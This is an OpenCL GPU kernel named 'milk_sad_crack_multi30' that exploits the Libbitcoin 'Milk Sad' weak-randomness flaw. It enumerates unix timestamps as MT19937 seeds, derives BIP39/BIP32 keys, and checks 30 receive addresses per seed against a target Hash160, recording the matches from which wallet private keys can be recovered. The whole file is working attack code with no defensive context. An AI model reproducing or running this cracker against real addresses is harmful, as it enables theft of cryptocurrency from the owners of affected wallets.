// Libbitcoin "Milk Sad" Vulnerability - Multi-Path (30 addresses per seed)
// MT19937 seeded with unix timestamp (seconds)
// Checks m/44'/0'/0'/0/[0-29] - 30 receive addresses per timestamp

__kernel void milk_sad_crack_multi30(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid; // Unix timestamp in seconds
    
    // Generate 128-bit entropy using MT19937 (MSB extraction for Milk Sad)
    uchar entropy[16] __attribute__((aligned(4)));
    mt19937_extract_msb_128(timestamp, entropy);
    
    // BIP39: Entropy → Mnemonic → Seed (PROPER IMPLEMENTATION)
    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete(entropy, seed);
    
    // BIP32: Master Key
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);
    
    // Derive m/purpose'/0'/0'/0 (base for all receive addresses)
    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);
    
    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);
    
    extended_private_key_t account0_key;
    hardened_private_child_from_private(&coin_key, &account0_key, 0);
    
    extended_private_key_t external_key;
    normal_private_child_from_private(&account0_key, &external_key, 0);
    
    // Check 30 receive addresses: m/44'/0'/0'/0/[0-29]
    for (uint addr_idx = 0; addr_idx < 30; addr_idx++) {
        extended_private_key_t address_key;
        normal_private_child_from_private(&external_key, &address_key, addr_idx);
        
        // Get public key
        extended_public_key_t address_pub;
        public_from_private(&address_key, &address_pub);
        
        // Generate Hash160
        uchar hash160[20];
        identifier_for_public_key(&address_pub, hash160);
        
        // Pack Hash160 for comparison
        ulong h1 = 0, h2 = 0;
        uint h3 = 0;
        for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
        for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
        for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
        
        // Compare
        if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
            uint idx = atomic_inc(result_count);
            if (idx < 1024) {
                // Store timestamp and address index (encode addr_idx in upper 32 bits)
                results[idx] = ((ulong)addr_idx << 32) | timestamp;
            }
        }
    }
}
